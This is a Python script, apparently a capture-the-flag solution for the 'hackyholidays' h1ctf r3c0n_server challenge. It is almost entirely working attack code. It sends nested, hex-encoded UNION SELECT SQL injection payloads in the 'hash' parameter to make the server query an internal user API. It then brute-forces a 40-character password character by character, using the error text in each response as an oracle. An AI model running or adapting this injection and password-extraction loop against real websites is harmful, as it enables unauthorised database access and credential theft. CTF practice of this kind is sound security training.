import requests
import re
import string




ch=string.ascii_lowercase+string.digits
#ch=string.printable




def extract(x):
    link = re.compile("""src=[\"\']/r(.*)[\"\']""")
    links = link.finditer(x)
    for i in links:
        l=i.group()
    return  l.replace("\"","").replace("src=","")
u=""



while len(u)!=40:
    #

    for i in ch:
        #




        session = requests.Session()
        payload="'   and 1=0 union select 1,2,'../api/user?password={}{}%' -- -' -- -".format(u,str(i))
        payloadhex=payload.encode().hex()

        paramsGet = {"hash":"jdh34k'and 1=0 union select 0x{},2,3 -- -".format(payloadhex)}
        headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Connection":"close","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36","Referer":"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59","Sec-Fetch-Site":"same-origin","Sec-Fetch-Dest":"document","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"navigate","Upgrade-Insecure-Requests":"1","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/json"}
        response = session.get("https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album", params=paramsGet, headers=headers)
        data=extract(response.text)
        #print(data)
        print(i)
        response2 = requests.get("https://hackyholidays.h1ctf.com{}".format(str(data)))
        if "Invalid content type detected"   in response2.text:

              u+=str(i)
              print("[+] {}".format(u))
              #break
        #print(response2.text)


